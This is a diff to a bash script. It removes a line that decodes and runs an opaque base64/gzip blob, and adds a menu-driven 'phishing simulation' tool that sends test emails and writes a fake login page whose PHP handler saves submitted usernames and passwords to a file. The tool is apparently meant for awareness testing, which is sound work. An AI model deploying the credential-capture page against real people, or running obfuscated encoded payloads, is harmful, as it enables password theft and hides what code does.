@@ -1,1 +1,101 @@
-bash -c "$(echo H4sICMkAX2cAA1R3b19vZl9DbHVicwCtWG1v2zYQ/u5fcdOMJtkSuW6afGgcF5nrrgW6NVi8D0M9BLR0tjjLpEpScYwk/31HypItW36ZMSKAxRPv7bkXnvLjD40BF40B01Gt1vnr5vfro/7r8/Nvzavzy8lR7Y/uXbc3J72mfS2JuI64GN1rPkljZrgUxyfwVANa04jHCEaleAWhdCS7ghiZKnYYRBLOELz6k1X34pXfeO7xfu9Vxf4M5dWbSpBD6MTpQJffPG9k70gRpoGB27m/cFf4Cz3URm9m39v2zdr3WpvYmz50FDKDwCAPFyzCBThhPN7M/sbPfcUF+xQHmhNht/ZzH35FgcqyD9kYIZYjLiBQGKIwnMV6K/tb38G70MymTJE8XY7cJvYLH36TghupQKc64QGXqYZACoGBdV5vZ7/0ofvIzWHIHxz3rBpcqVE5FO8ohiGcJeB1IskDfEdqAve0qCymEeoZEbgo6HY1T0pbd7xUiBUmuIJ0ueOQ35w9vu8vDF4VWNjdFQYVbQOecIp9xmrdKEi7eHU6+IcCBzEXzv/5frMPPbIY6G+b7X1xS0AQcqEEIQ3BwoPxcrqQtrH2PUqI/pomVztnmtCa2+LRY+GPB69eVTCtQlw0lawUtQXHSFjIWaALz1VWrAr8SGIwtDJIVrjwPXMYOhGSh04XlcKQj1LlANkSxKurEunNodl0h8YlU5pQTOahwHCtsWxNqKzGsowwEcWNE1BU4jO6cVAhzGQKU5ZhGGSdzx6rygCr692WlP1QiD5Gf+SfQuOBqcZ0Om1EZhKfuBwkEfdkwnpqjInqpNTzM+uaAmagvXSiwUWIj76V7kGr1f36sdaymzb9kFHtluEmxnbFNdRqZK9aDXew1hrIcGbZmu0vruV+ImzoZZNoQ6kmMEETyfDau/161/OAuX547QUsMalCP4kSr+3MbXGRpATmLMFrz+AjZbVgE3pONSr75EESswAjGYeorr0/c3K7NVAVIhKm9VSqMBez2JfE3ObkDWKo3iacbHlgcUpb5yNZ3GpY5+zv3P9GBp9Fcif4y87n6L+nTa1fH9pZ5hqGMkFxnKMU3i/dY74haE7BY97JVW04VST0OOMjYg6KzRgf+vV7i/q3oxzCo7+J6kHu88qpHKHsVL8vnIYgljrXQPv31T5u7DUrVTCvlBAIkwIQuvpRPdBdYiDV2R1ABUpNhYhq/25xfmi3mE8OVnP17LC1T1AiAKd7EJ6avn/xUhpC17QuRcgGpc5Pl6JhA1DnHrTbzo7VqK9JDaXAPZr0GEtz0Gg+J4XW5qMqRUf7Y/72UMztuGUBX5+49mjKeTuq5IfBzN1HWSJ9T60imsQY9Vjbqm2PttD7O0eI7Jq04a1QYkisrR93aJ/JoOIWKktbTAgKHzhOnaXMGBZExFTyY9eUUFTfTaHB4m2HBmfvfx0YyoYuJofsov+fpoYVNPZOwYtDU3A+sruy3zi5785GK/FWWbs7RsU/d5xnRiYwKeRTaNeZBRptqA2emVQkFM+RQpt6d72bX758vvvU/eDlxDMOXmRMYgkGccnS+2VLqW3twupyHatVVOyXiDV5m98DqpTxLl0/7db1WdC1ysP5BwZ9g9EExEaM7zkiombBxi/8LCRMzGCMMxsThXSXirwFTFCklT5mTUBA01bSWZZFrtG+VP4bovYvomt4g8sQAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+phishing_simulation() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________"
+        echo "    |               Two of Clubs              |"
+        echo "    |    Conduct Phishing Simulation Tests    |"
+        echo "    |_________________________________________|"
+        echo "    |                                         |"
+        echo "    |  1. Create a phishing simulation email  |"
+        echo "    |  2. Simulate phishing website           |"
+        echo "    |  3. Generate fake login credentials     |"
+        echo "    |  4. Test phishing awareness             |"
+        echo "    |  5. Monitor suspicious connections      |"
+        echo "    |  6. Exit                                |"
+        echo "    |_________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Creating a phishing simulation email...${RESET}"
+                read -p "Enter recipient email: " recipient
+                read -p "Enter subject line: " subject
+                echo -e "This is a phishing simulation email.\nPlease do not click suspicious links." | \
+                mail -s "$subject" "$recipient" && \
+                echo -e "${CYAN}Phishing email sent to $recipient.${RESET}" || \
+                echo -e "${CYAN}Failed to send phishing email. Check mail configuration.${RESET}"
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Setting up a simulated phishing website...${RESET}"
+                echo "Enter the directory where you want to create the phishing simulation site:"
+                read -p "Directory (e.g., /var/www/html): " site_dir
+                mkdir -p "$site_dir"
+                cat > "$site_dir/index.html" <<EOF
+<html>
+<head><title>Phishing Simulation</title></head>
+<body>
+<h1>Login Here</h1>
+<form method="POST" action="capture.php">
+    <input type="text" name="username" placeholder="Username"><br>
+    <input type="password" name="password" placeholder="Password"><br>
+    <input type="submit" value="Login">
+</form>
+</body>
+</html>
+EOF
+                cat > "$site_dir/capture.php" <<EOF
+<?php
+\$file = fopen("captured_credentials.txt", "a");
+fwrite(\$file, "Username: " . \$_POST['username'] . " Password: " . \$_POST['password'] . "\\n");
+fclose(\$file);
+?>
+EOF
+                echo -e "${CYAN}Phishing simulation site created at $site_dir. Serve it using a web server.${RESET}"
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Generating fake login credentials...${RESET}"
+                for i in {1..5}; do
+                    echo "Username: user$i, Password: pass$i" >> fake_credentials.txt
+                done
+                echo -e "${CYAN}Fake credentials generated in 'fake_credentials.txt'.${RESET}"
+                ;;
+            4)
+                clear
+                echo -e "${CYAN}Testing phishing awareness...${RESET}"
+                echo "Simulating phishing awareness by sending a questionnaire to the user."
+                read -p "Enter email for phishing awareness test: " email
+                echo -e "This is a simulated phishing awareness test.\nPlease review the attached questionnaire." | \
+                mail -s "Phishing Awareness Test" "$email" && \
+                echo -e "${CYAN}Phishing awareness test sent to $email.${RESET}" || \
+                echo -e "${CYAN}Failed to send phishing awareness test.${RESET}"
+                ;;
+            5)
+                clear
+                echo -e "${CYAN}Monitoring for suspicious connections...${RESET}"
+                echo -e "Press Ctrl+C to stop monitoring.\n"
+                netstat -tunp | grep "ESTABLISHED" | grep -i "http" | tee suspicious_connections.log
+                ;;
+            6)
+                echo -e "${CYAN}Exiting...${RESET}"
+                break
+                ;;
+            *)
+                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
+                ;;
+        esac
+        echo -e "${CYAN}Press any key to return to the menu...${RESET}"
+        read -n 1 -s -r
+    done
+}
+
+phishing_simulation
